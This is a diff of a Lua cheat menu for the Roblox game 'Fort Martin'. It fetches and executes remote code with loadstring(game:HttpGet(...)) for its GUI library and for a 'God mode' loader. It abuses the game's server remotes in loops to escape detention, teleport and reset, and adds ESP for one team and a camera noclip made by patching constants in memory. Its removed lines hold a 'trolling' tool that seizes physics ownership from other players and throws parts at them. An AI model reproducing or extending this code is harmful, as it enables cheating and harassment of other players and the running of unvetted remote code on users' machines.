@@ -1,12 +1,13 @@
 local script12321 = "ADMIN"
 local game12321 = "Game: Fort Martin"
 
+
 local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/UD92IlIllllII421248535IlIIIIIIIlllIlIIl/Yeah/main/.gitignore"))()
 local GUI = Mercury:Create{
-    Name = "Home",
-    Size = UDim2.fromOffset(600, 400),
+    Name = "Mercury",
+    Size = UDim2.fromOffset(615, 400),
     Theme = Mercury.Themes.Dark,
-    Link = "https://github.com/RogueMasterGUI/ADMIN"
+    Link = "http://discord.gg/wUbAAhypTH"
 }
 
 local Tab = GUI:Tab{
@@ -16,7 +17,7 @@ local Tab = GUI:Tab{
 
 Tab:Button{
 	Name = "MPC undetain TP",
-	Description = nil,
+	Description = "This is used when MPC is spawn camping. Note: Risk of getting kicked/banned.",
 	Callback = function() 
 	    local CoreGui = game:GetService("StarterGui")
 
@@ -26,6 +27,12 @@ Tab:Button{
 	Duration = 8,
 	Callback = function() end
 }
+GUI:Notification{
+	Title = "Alert",
+	Text = "Detain time before able to leave game:",
+	Duration = 125,
+	Callback = function() end
+}
 local args = {
     [1] = 1
 }
@@ -33,48 +40,27 @@ local args = {
 game:GetService("ReplicatedStorage").Packages.Knit.Services.SkydivingService.RF.FallDamage:InvokeServer(unpack(args))
 
 game:GetService("ReplicatedStorage").Packages.Knit.Services.PlayerHandler.RF.Respawn:InvokeServer()
-
-wait(0.1)
+wait(1)
 game:GetService("ReplicatedStorage").Packages.Knit.Services.PlayerHandler.RF.RequestDeploy:InvokeServer()
-
 
 wait(0.2)
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-215.136826, 10.2285948, 1628.71802, 0.475295752, -5.86179716e-10, -0.879826069, -8.12481638e-10, 1, -1.10516019e-09, 0.879826069, 1.24012045e-09, 0.475295752)
 
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
-wait(5)
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
-wait(50)
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
-wait(68)
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
-wait(3)
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
-wait(3)
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
-wait(3)
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
-wait(3)
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
-wait(3)
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
-wait(3)
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
-wait(3)
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
-wait(3)
+while wait() do
+    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
+end
 end}
 
 Tab:Button{
-	Name = "MPC undetain/force-reset",
-	Description = nil,
+	Name = "MPC undetain",
+	Description = "Removes MPC detainment.",
 	Callback = function() 
 	    local CoreGui = game:GetService("StarterGui")
 
-            GUI:Notification{
+GUI:Notification{
 	Title = "Alert",
-	Text = "Reseting...",
-	Duration = 8,
+	Text = "Detain time before able to leave game:",
+	Duration = 125,
 	Callback = function() end
 }
 local args = {
@@ -82,7 +68,7 @@ local args = {
 }
 
 game:GetService("ReplicatedStorage").Packages.Knit.Services.PlayerHandler.RF.Reset:InvokeServer()
-wait(0.1)
+wait(1)
 game:GetService("ReplicatedStorage").Packages.Knit.Services.PlayerHandler.RF.RequestDeploy:InvokeServer()
 
 wait(0.3)
@@ -106,33 +92,266 @@ wait(1)
 game:GetService("ReplicatedStorage").Packages.Knit.Services.PlayerHandler.RF.Respawn:InvokeServer()
 wait(1)
 game:GetService("ReplicatedStorage").Packages.Knit.Services.PlayerHandler.RF.Respawn:InvokeServer()
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
-wait(5)
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
-wait(50)
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
-wait(68)
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
-wait(3)
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
-wait(3)
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
-wait(3)
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
-wait(3)
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
-wait(3)
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
-wait(3)
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
-wait(3)
-game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
-wait(3)
+while wait() do
+    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
+end
+end}
+
+Tab:Toggle{
+	Name = "MPC ESP",
+	StartingState = false,
+	Description = "It will show the location of all military corps.",
+	Callback = function(state)
+	   getgenv().ESP2 = true
+            getgenv().ESP2 = state
+    -- Define the ESP update interval (in seconds)
+    local ESP2_UPDATE_INTERVAL = 2
+    
+    -- Create a function to update the ESP
+    
+    local function updateESP2()
+        -- Loop through all players in the game
+        for _, player in pairs(game:GetService("Players"):GetChildren()) do
+            -- Check if the player is on the MPC team
+            if player.Team and player.Team.Name == "MPC" then
+                -- Check if the player already has an ESP billboard
+                local existingBillboardGui = player.Character and player.Character:FindFirstChild("ESP2")
+                if not existingBillboardGui then
+                    -- Create a new billboard gui for the player
+                    local billboardGui = Instance.new("BillboardGui")
+                    billboardGui.Name = "ESP2"
+                    billboardGui.Size = UDim2.new(0, 100, 0, 100)
+                    billboardGui.AlwaysOnTop = true
+                    billboardGui.LightInfluence = 0
+                    billboardGui.MaxDistance = math.huge
+                    billboardGui.Parent = player.Character or player.CharacterAdded:Wait()
+    
+                    -- Create a text label for the player's username and distance
+                    local nameLabel = Instance.new("TextLabel")
+                    nameLabel.Name = "NameLabel"
+                    nameLabel.Parent = billboardGui
+                    nameLabel.Size = UDim2.new(1, 0, 0.5, 0)
+                    nameLabel.Position = UDim2.new(0, 0, 0, 0)
+                    nameLabel.BackgroundTransparency = 1
+                    nameLabel.Text = player.Name .. " (" .. tostring(math.floor((player.Character and player.Character:FindFirstChild("HumanoidRootPart") and (player.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude or 0) + 0.5)) .. " studs)"
+                    nameLabel.TextColor3 = Color3.new(1, 1, 1)
+                    nameLabel.FontSize = Enum.FontSize.Size18
+                    nameLabel.Font = Enum.Font.SourceSansBold
+                else
+                    -- Update the existing ESP billboard
+                    existingBillboardGui.Enabled = true
+                    existingBillboardGui.NameLabel.Text = player.Name .. " (" .. tostring(math.floor((player.Character and player.Character:FindFirstChild("HumanoidRootPart") and (player.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude or 0) + 0.5)) .. " studs)"
+                end
+            end
+        end
+    end
+    
+    -- Check if getgenv is set to true or false
+    if getgenv().ESP2 == true then
+        -- Create a loop to update the ESP every few seconds
+    while true do
+    if getgenv().ESP2 then
+        updateESP2()
+    end
+    wait(ESP2_UPDATE_INTERVAL)
+    end
+
+    else
+        -- Hide all existing ESP billboards
+        for _, player in pairs(game:GetService("Players"):GetChildren()) do
+            local existingBillboardGui = player.Character and player.Character:FindFirstChild("ESP2")
+            if existingBillboardGui then
+                existingBillboardGui.Enabled = false
+            end
+        end
+    end
+    
+    local holder = game.CoreGui:FindFirstChild("ESP2Holder") or Instance.new("Folder")
+    if ESP2 == false then
+        holder:Destroy()
+    end
+    
+    if holder.Name == "Folder" then
+        holder.Name = "ESP2Holder"
+        holder.Parent = game.CoreGui
+    end
+    
+    if uselocalplayer == false and holder:FindFirstChild(game.Players.LocalPlayer.Name) then
+        holder:FindFirstChild(game.Players.LocalPlayer.Name):Destroy()
+    end
+    
+    if getgenv().ESP2 == true then 
+        getgenv().ESP2 = false
+        getgenv().ESP2 = true
+    end
+    
+    while getgenv().ESP2 do
+        task.wait()
+        for _,v in pairs(game.Players:GetChildren()) do
+            if v.Team ~= nil and v.Team.Name == "MPC" then -- Check if player is on the MPC team
+                local chr = v.Character
+                if chr ~= nil then
+                    local ESP2 = holder:FindFirstChild(v.Name) or Instance.new("Highlight")
+                    ESP2.Name = v.Name
+                    if uselocalplayer == false and ESP2.Name == game.Players.LocalPlayer.Name then
+                    else
+                        ESP2.Parent = holder
+                        if filluseteamcolor then
+                            ESP2.FillColor = v.TeamColor.Color
+                        else
+                            ESP2.FillColor = fillcolor 
+                        end
+                        if outlineuseteamcolor then
+                            ESP2.OutlineColor = v.TeamColor.Color
+                        else
+                            ESP2.OutlineColor = outlinecolor    
+                        end
+                        ESP2.FillTransparency = filltrans
+                        ESP2.OutlineTransparency = outlinetrans
+                        ESP2.Adornee = chr
+                        ESP2.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+                    end
+                end
+            end
+        end
+    end
+        getgenv().ESP2 = true == state
+end}
+
+
+
+Tab:Toggle{
+	Name = "MPC HIGHLIGHT ESP",
+	StartingState = false,
+	Description = "Higlights all military corps. Note: This dose not work in at far distance.",
+	Callback = function(state)
+getgenv().ESP = true
+getgenv().ESP = state
+getgenv().uselocalplayer = false
+getgenv().filluseteamcolor = true
+getgenv().outlineuseteamcolor = false
+getgenv().fillcolor = Color3.new(0, 0, 0)
+getgenv().outlinecolor = Color3.new(1, 1, 1)
+getgenv().filltrans = 0.5
+getgenv().outlinetrans = 0
+
+local holder = game.CoreGui:FindFirstChild("ESPHolder") or Instance.new("Folder")
+if not getgenv().ESP then
+    holder:Destroy()
+else
+    if holder.Name == "Folder" then
+        holder.Name = "ESPHolder"
+        holder.Parent = game.CoreGui
+    end
+    if not getgenv().uselocalplayer and holder:FindFirstChild(game.Players.LocalPlayer.Name) then
+        holder:FindFirstChild(game.Players.LocalPlayer.Name):Destroy()
+    end
+end
+
+game.Players.PlayerAdded:Connect(function(player)
+    if player.Team ~= nil and player.Team.Name == "MPC" then
+        local chr = player.Character
+        if chr ~= nil then
+            local esp = holder:FindFirstChild(player.Name) or Instance.new("Highlight")
+            esp.Name = player.Name
+            if not getgenv().uselocalplayer or esp.Name ~= game.Players.LocalPlayer.Name then
+                esp.Parent = holder
+                if getgenv().filluseteamcolor then
+                    esp.FillColor = player.TeamColor.Color
+                else
+                    esp.FillColor = getgenv().fillcolor
+                end
+                if getgenv().outlineuseteamcolor then
+                    esp.OutlineColor = player.TeamColor.Color
+                else
+                    esp.OutlineColor = getgenv().outlinecolor
+                end
+                esp.FillTransparency = getgenv().filltrans
+                esp.OutlineTransparency = getgenv().outlinetrans
+                esp.Adornee = chr
+                esp.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+            end
+        end
+    end
+end)
+
+while true do
+    if getgenv().ESP then
+        for _,v in pairs(game.Players:GetChildren()) do
+            if v.Team ~= nil and v.Team.Name == "MPC" then
+                local chr = v.Character
+                if chr ~= nil then
+                    local esp = holder:FindFirstChild(v.Name) or Instance.new("Highlight")
+                    esp.Name = v.Name
+                    if not getgenv().uselocalplayer or esp.Name ~= game.Players.LocalPlayer.Name then
+                        esp.Parent = holder
+                        if getgenv().filluseteamcolor then
+                            esp.FillColor = v.TeamColor.Color
+                        else
+                            esp.FillColor = getgenv().fillcolor
+                        end
+                        if getgenv().outlineuseteamcolor then
+                            esp.OutlineColor = v.TeamColor.Color
+                        else
+                            esp.OutlineColor = getgenv().outlinecolor
+                        end
+                        esp.FillTransparency = getgenv().filltrans
+                        esp.OutlineTransparency = getgenv().outlinetrans
+                        esp.Adornee = chr
+                        esp.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+                    end
+                end
+            end
+        end
+    else
+        holder:ClearAllChildren()
+    end
+    task.wait()
+end
+getgenv().ESP = true == state
+end}
+
+Tab:Button{
+	Name = "Cammra Noclip",
+	Description = "Allows your cammra to go through the walls.",
+	Callback = function()
+for useless, garbage in next,getgc() do
+   if getfenv(garbage).script == game.Players.LocalPlayer.PlayerScripts.PlayerModule.CameraModule.ZoomController.Popper and typeof(garbage) == "function" then
+       for number, value in next, getconstants(garbage) do
+           if tonumber(value) == 0.25 then
+               setconstant(garbage,number,0)
+           elseif tonumber(value) == 0 then
+               setconstant(garbage,number,0.25)
+           end
+       end
+   end
+end
+end}
+
+Tab:Button{
+	Name = "Allow Reset",
+	Description = "Allowing reset even during detained.",
+	Callback = function() 
+	    local CoreGui = game:GetService("StarterGui")
+
+            GUI:Notification{
+	Title = "Alert",
+	Text = "Reseting...",
+	Duration = 8,
+	Callback = function() end
+}
+
+while wait() do
+    game:GetService("StarterGui"):SetCore("ResetButtonCallback",true)
+end
+while wait() do
+    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
+end
 end}
 
 Tab:Button{
 	Name = "God mode",
-	Description = nil,
+	Description = "God Mode gives you infinite health. Note: Risk of getting kicked/banned.",
 	Callback = function() 
 	    local CoreGui = game:GetService("StarterGui")
 
@@ -143,661 +362,6 @@ Tab:Button{
 	Callback = function() end
 }
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Ihaveash0rtnamefordiscord/Releases/main/FortMartinGodmode"))(' Watermelon ?')
-end}
-Tab:Button{
-	Name = "Take damage [trolling]",
-	Description = nil,
-	Callback = function() 
-	    local CoreGui = game:GetService("StarterGui")
-
-            GUI:Notification{
-	Title = "Alert",
-	Text = "If at full health you can click the *Take damage* 4 times without dying.",
-	Duration = 8,
-	Callback = function() end
-}
-local args = {
-    [1] = 0.2
-}
-
-game:GetService("ReplicatedStorage").Packages.Knit.Services.SkydivingService.RF.FallDamage:InvokeServer(unpack(args))
-
-end}
-
-Tab:Button{
-	Name = "Unanchored Parts (For trolling)",
-	Description = nil,
-	Callback = function() 
-	    local CoreGui = game:GetService("StarterGui")
-
-            GUI:Notification{
-	Title = "Alert",
-	Text = "Reseting...",
-	Duration = 3,
-	Callback = function() end
-}
-if not _G.ini then
-_G.ini = true
-
-local sound = Instance.new("Sound")
-sound.SoundId = "rbxassetid://216917652"
-sound.Parent = game:GetService("SoundService")
-sound:Play()
-
-
-
-wait()
-game.StarterGui:SetCore("SendNotification", {
-Title = "Unanchored To Player"; -- the title (ofc)
-Text = "GUI Loaded - F to Hide/Show"; -- what the text says (ofc)
-Duration = 5; -- how long the notification should in secounds
-})
-
-print "================UNANCHORED TO PLAYER LOADED================"
-print "================MADE BY TomQ#6764================"
-
-local heartbeat = game:GetService("RunService").Heartbeat
-spawn(function()
-    while true do heartbeat:Wait()
-    for i,v in pairs(game.Players:GetPlayers()) do
-        if v == game.Players.LocalPlayer == false then
-            game.Players.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)*math.huge
-            game.Players.LocalPlayer.SimulationRadius = math.pow(math.huge,math.huge)*math.huge
-            v.MaximumSimulationRadius = 0
-            v.SimulationRadius = 0
-            game:GetService("RunService").Stepped:wait()
-    end
-end
-end
-end)
-
-local Imput = game:GetService("UserInputService")
-local Plr = game.Players.LocalPlayer
-local Mouse = Plr:GetMouse()
-
-function To(position)
-local Chr = Plr.Character
-local sound2 = Instance.new("Sound")
-sound2.SoundId = "rbxassetid://3398620867"
-sound2.Parent = game:GetService("SoundService")
-if Chr ~= nil then
-for index, part in pairs(game:GetDescendants()) do
-if part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then --// Checks Part Properties
-    part.CFrame = CFrame.new(position) --TP Part To Mouse
-    sound2:Play()
-
-    if spam == true and part:FindFirstChild("BodyGyro") == nil then
-    local bodyPos = Instance.new("BodyPosition")
-    bodyPos.Position = part.Position
-    bodyPos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
-    bodyPos.P = 1e6
-    bodyPos.Parent = part
-    end
-end
-end
-end
-end
-
-
-
-
-
-Imput.InputBegan:Connect(function(input)
-   if input.UserInputType == Enum.UserInputType.MouseButton1 and Imput:IsKeyDown(Enum.KeyCode.LeftControl) then
-       To(Mouse.Hit.p)
-   end
-end)
-
-
-
-
-
-
-
--- key that opens/closes the ui
-local toggle_key = Enum.KeyCode.F
-
--- function that executes desired code
-execute = function(name)
-
-
-
-    for index, part in pairs(game:GetDescendants()) do
-    if part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then --// Checks Part Properties
-    part.CFrame = CFrame.new(game.workspace[name].Head.Position) --TP Part To User
-    end
-    end
-
-
-
-end
-
-local uis = game:GetService("UserInputService")
-local ts = game:GetService("TweenService")
-
--- ui functions
-fade = function(obj, len, props)
-	ts:Create(obj, TweenInfo.new(len, Enum.EasingStyle.Sine), props):Play()
-end
-
--- shorthand variables
-local u2, c3 = UDim2.new, Color3.fromRGB
-local u2f, c3w = u2(1, 0, 1, 0), c3(255, 255, 255)
-
--- ui init
-local g = Instance.new("ScreenGui", game.CoreGui)
-local f = Instance.new("Frame", g)
-local t = Instance.new("TextLabel", f)
-local c = Instance.new("ScrollingFrame", f)
-
--- core ui styling
-local padding = Instance.new("UIPadding", f)
-local maxsize = Instance.new("UISizeConstraint", f)
-local textsize = Instance.new("UITextSizeConstraint", t)
-local listcons = Instance.new("UIListLayout", c)
-
-padding.PaddingBottom = UDim.new(0, 8)
-padding.PaddingLeft = UDim.new(0, 15)
-padding.PaddingRight = UDim.new(0, 15)
-padding.PaddingTop = UDim.new(0, 0)
-
-maxsize.MaxSize = Vector2.new(275, 450)
-maxsize.MinSize = Vector2.new(200, 0)
-textsize.MaxTextSize = 16
-listcons.Padding = UDim.new(0, 3)
-
--- ui instance properties
-g.Name = "unanchor_ui"
-g.ResetOnSpawn = false
-f.Name = "main"
-t.Name = "header"
-
-f.Size = u2(0.165, 0, 0.6, 0)
-f.BorderSizePixel = 0
-f.BackgroundTransparency = 0.3
-f.Position = u2(1, -215, 0.5, -150)
-f.BackgroundColor3 = c3()
-f.AnchorPoint = Vector2.new(1, 0.5)
-f.Position = u2(1, -15, 0.5, 0)
-
-t.Size = u2(1, 0, 0.1, 0)
-t.BackgroundTransparency = 1
-t.TextColor3 = c3w
-t.Font = Enum.Font.GothamBold
-t.TextScaled = true
-t.TextXAlignment = Enum.TextXAlignment.Center
-t.Text = "UNANCHORED TO PLAYER BY TomQ#6764"
-
-c.Name = "playerlist"
-c.Position = u2(0, 0, 0.1, 0)
-c.Size = u2(1, 0, 0.45, 0)
-c.BackgroundTransparency = 1
-c.BorderSizePixel = 0
-c.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
-c.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
-c.ScrollingDirection = Enum.ScrollingDirection.Y
-c.ScrollBarThickness = 5
-c.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar
-
--- playerlist entry ui template
-local temp = Instance.new("Frame", f)
-temp.Name = "temp"
-temp.Visible = false
-temp.Size = u2(1, -5, 0, 27)
-temp.BackgroundTransparency = 0.5
-temp.BorderSizePixel = 0
-temp.ClipsDescendants = true
-temp.BackgroundColor3 = c3()
-
-local tpad = Instance.new("UIPadding", temp)
-tpad.PaddingLeft = UDim.new(0, 5)
-tpad.PaddingRight = UDim.new(0, 5)
-
-local tb = Instance.new("TextButton", temp)
-tb.Name = "button"
-tb.BackgroundTransparency = 1
-tb.ZIndex = 5
-tb.BorderSizePixel = 0
-tb.Text = ""
-tb.Size = u2(1, 10, 1, 0)
-tb.Position = u2(0, -5, 0, 0)
-
-local tcl = Instance.new("TextLabel", temp)
-tcl.Name = "username"
-tcl.BackgroundTransparency = 1
-tcl.BorderSizePixel = 0
-tcl.Size = u2f
-tcl.TextColor3 = c3w
-tcl.TextXAlignment = Enum.TextXAlignment.Left
-tcl.TextScaled = true
-tcl.Size = u2(0.6, 0, 1, 0)
-tcl.Font = Enum.Font.Gotham
-
-local tcls = Instance.new("UITextSizeConstraint", tcl)
-tcls.MaxTextSize = 14
-
-local thumb = Instance.new("ImageLabel", temp)
-thumb.Name = "thumb"
-thumb.Size = u2(0.35, 0, 0.35, 0)
-thumb.SizeConstraint = Enum.SizeConstraint.RelativeXX
-thumb.Position = u2(1, 0, 0, -15)
-thumb.AnchorPoint = Vector2.new(1, 0)
-thumb.BackgroundTransparency = 1
-thumb.BorderSizePixel = 0
-
--- settings ui
-local sh = Instance.new("TextLabel", f)
-sh.Name = "settings_header"
-sh.Size = u2(1, 0, 0.1, 0)
-sh.Position = u2(0, 0, 0.55, 0)
-sh.BackgroundTransparency = 1
-sh.BorderSizePixel = 0
-sh.ZIndex = 3
-sh.TextColor3 = c3w
-sh.Font = Enum.Font.GothamBold
-sh.TextScaled = true
-sh.TextXAlignment = Enum.TextXAlignment.Center
-sh.Text = "SETTINGS"
-
-local shs = Instance.new("UITextSizeConstraint", sh)
-shs.MaxTextSize = 16
-
-local items = Instance.new("ScrollingFrame", f)
-items.Name = "items"
-items.Size = u2(1, 0, 0.35, 0)
-items.Position = u2(0, 0, 0.65, 0)
-items.BackgroundTransparency = 1
-items.BorderSizePixel = 0
-items.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
-items.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
-items.ScrollingDirection = Enum.ScrollingDirection.Y
-items.ScrollBarThickness = 5
-items.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar
-
-local itemll = Instance.new("UIListLayout", items)
-itemll.Padding = UDim.new(0, 3)
-
-createSetting = function(name)
-	local setting = Instance.new("Frame", items)
-	setting.Size = u2(1, -5, 0, 27)
-	setting.BackgroundColor3 = c3()
-	setting.BackgroundTransparency = 0.5
-	setting.BorderSizePixel = 0
-	
-	local spad = tpad:Clone()
-	spad.Parent = setting
-	
-	local slab = tcl:Clone()
-	slab.Name = "label"
-	slab.Parent = setting
-	slab.Size = u2(1, 0, 1, 0)
-	slab.Text = name
-	
-	local stbt = tb:Clone()
-	stbt.Parent = setting
-	
-	stbt.MouseEnter:connect(function()
-		fade(setting, 0.25, {BackgroundTransparency = 0.8})
-	end)
-	
-	stbt.MouseLeave:connect(function()
-		fade(setting, 0.25, {BackgroundTransparency = 0.5})
-	end)
-	
-	items.CanvasSize = u2(0, 0, 0, itemll.AbsoluteContentSize.Y)
-	
-	return stbt
-end
-
-
--- settings & functionality
-
-
-
-    local sound = Instance.new("Sound")
-    sound.SoundId = "rbxassetid://179235828"
-    sound.Parent = game:GetService("SoundService")
-
-
-spam = false
-local spamblocks = createSetting("Spam Parts")
-spamblocks.MouseButton1Down:connect(function()
-spam = not spam
-   if spam then
-       fade(spamblocks.Parent.label, 0.25, {TextColor3 = c3(52, 189, 98)})
-       sound:Play()
-       -- code to loop here
-   else
-       fade(spamblocks.Parent.label, 0.25, {TextColor3 = c3w})
-       sound:Play()
-       -- code to break the loop here
-   end
-end)
-
-
-
-createSetting("Break Spam").MouseButton1Down:connect(function()
-    for index, part in pairs(game:GetDescendants()) do
-    if part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then --// Checks Part Properties
-    sound:Play()
-    if part:FindFirstChild("BodyForce") then
-    part.BodyForce:Destroy()
-    end
-
-    if part:FindFirstChild("BodyGyro") then
-    part.BodyGyro:Destroy()
-    end
-
-    if part:FindFirstChild("BodyPosition") then
-    part.BodyPosition:Destroy()
-    end
-
-    if part:FindFirstChild("BodyThrust") then
-    part.BodyThrust:Destroy()
-    end
-end
-end
-end)
-
-freeze = false
-local freezeblocks = createSetting("Freeze Parts")
-freezeblocks.MouseButton1Down:connect(function()
-freeze = not freeze
-    if freeze then
-        fade(freezeblocks.Parent.label, 0.25, {TextColor3 = c3(52, 189, 98)})
-        sound:Play()
-        print "UTP: Freezed Parts"
-        for _,part in pairs(workspace:GetChildren()) do
-        if part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then --// Checks Part Properties
-            local bodyPos = Instance.new("BodyPosition")
-            bodyPos.Position = part.Position
-            bodyPos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
-            bodyPos.P = 1e6
-            bodyPos.Parent = part
-        end
-        end
-    else
-        fade(freezeblocks.Parent.label, 0.25, {TextColor3 = c3w})
-        sound:Play()
-        print "UTP: Thawed Parts"
-        for _,part in pairs(workspace:GetChildren()) do
-        if part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then --// Checks Part Properties
-            if part:FindFirstChild("BodyPosition") then
-            part.BodyPosition:Destroy()
-            end
-        end
-       -- code to break the loop here
-end
-end
-end)
-
-createSetting("Remove Accessories Mesh").MouseButton1Down:connect(function()
-    sound:Play()
-
-    local plr = game:GetService("Players").LocalPlayer
-    local char = plr.Character
-    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-    if v:IsA("Accessory") and v.Handle:FindFirstChild("SpecialMesh") then
-    ag = v.Handle:FindFirstChild("SpecialMesh")
-    ag:Destroy()
-    end
-    end
-
-
-    local plr = game:GetService("Players").LocalPlayer
-    local char = plr.Character
-    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-    if v:IsA("Accessory") and v.Handle:FindFirstChild("Mesh") then
-    ag = v.Handle:FindFirstChild("Mesh")
-    ag:Destroy()
-    end
-    end
-end)
-
-createSetting("Drop Accessories").MouseButton1Down:connect(function()
-    sound:Play()
-	for _,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-		if v:IsA("Accessory") then
-            v.Handle.Parent = workspace
-			v.Parent = workspace
-		end
-	end
-end)
-
-createSetting("Reset").MouseButton1Down:connect(function()
-    sound:Play()
-	game.Players.LocalPlayer.Character:BreakJoints()
-end)
-
-
-highlight = false
-local highlights = createSetting("Highlight Unanchored")
-highlights.MouseButton1Down:connect(function()
-highlight = not highlight
-    if highlight then
-        fade(highlights.Parent.label, 0.25, {TextColor3 = c3(52, 189, 98)})
-        sound:Play()
-        print "UTP: Unanchored Highlighted"
-        for _,part in pairs(workspace:GetDescendants()) do
-        if part:IsA("BasePart") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false and part:FindFirstChild("Weld") == nil then --// Checks Part Properties
-            local selectionBox = Instance.new("SelectionBox")
-            selectionBox.Adornee = part
-            selectionBox.Color3 = Color3.new(1,0,0)
-            selectionBox.Parent = part
-        end
-        end
-    else
-        fade(highlights.Parent.label, 0.25, {TextColor3 = c3w})
-        sound:Play()
-        print "UTP: Unanchored Un-Highlighted"
-        for _,part in pairs(workspace:GetDescendants()) do
-        if part:IsA("BasePart") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false and part:FindFirstChild("Weld") == nil then --// Checks Part Properties
-            if part:FindFirstChild("SelectionBox") then
-            part.SelectionBox:Destroy()
-            end
-        end
-end
-end
-end)
-
-createSetting("Check Other Players").MouseButton1Down:connect(function()
-    sound:Play()
-    g = 0
-    spawn(function()
-        for i,v in pairs(game.Players:GetPlayers()) do
-            if v.SimulationRadius > 5555 then
-                g = g + 1
